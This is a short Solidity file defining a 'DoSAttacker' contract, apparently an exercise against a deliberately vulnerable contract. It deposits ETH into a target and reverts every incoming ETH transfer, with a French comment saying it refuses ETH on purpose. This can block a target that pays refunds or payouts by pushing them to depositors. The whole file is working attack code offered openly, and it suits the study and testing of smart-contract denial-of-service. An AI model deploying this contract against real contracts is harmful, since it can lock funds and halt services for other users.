// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableDoS {
    function deposit() external payable;
}

contract DoSAttacker {
    IVulnerableDoS public target;

    constructor(address _target) {
        target = IVulnerableDoS(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
    }

    // Refuse volontairement de recevoir des ETH
    receive() external payable {
        revert("I refuse ETH");
    }
}
